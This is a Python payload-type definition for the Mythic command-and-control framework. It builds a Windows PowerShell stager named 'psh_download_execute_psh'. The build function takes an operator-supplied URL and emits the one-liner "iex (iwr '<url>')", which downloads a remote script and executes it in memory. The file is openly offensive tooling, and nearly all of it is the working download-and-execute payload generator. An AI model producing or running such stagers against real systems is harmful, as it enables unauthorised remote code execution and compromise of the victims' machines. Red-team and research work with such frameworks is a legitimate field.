import logging
import pathlib
import traceback
from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json
import os
import shutil
import base64
import random

class PSH_download_execute_psh(PayloadType):
    name = "psh_download_execute_psh"
    file_extension = "ps1"
    author = "@hegusung"
    supported_os = [SupportedOS.Windows]
    wrapper = False
    note = """Downloads a powershell script will be downloaded and executed"""
    supports_dynamic_loading = True
    c2_profiles = []
    mythic_encrypts = True
    translation_container = None # "myPythonTranslation"
    agent_path = pathlib.Path(".") / "powershell"
    agent_icon_path = agent_path / "agent_functions" / "basic_python_agent.svg"
    agent_code_path = agent_path / "agent_code"
    build_parameters = [
        BuildParameter(
            name = "ps1_url",
            parameter_type=BuildParameterType.String,
            description="Powershell script to be downloaded and executed",
        ),
    ]

    build_steps = [
    ]

    async def build(self) -> BuildResponse:
        # this function gets called to create an instance of your payload
        resp = BuildResponse(status=BuildStatus.Success)
        # create the payload
        build_msg = ""

        try:
            url = self.get_parameter("ps1_url")
            
            payload = """iex (iwr '%s')""" % url

            resp.payload = payload
            resp.build_message = "Successfully built!\n"

        except Exception as e:
            traceback.print_exc()

            resp.set_status(BuildStatus.Error)
            resp.build_stderr = "Error building payload: " + str(e)
        return resp
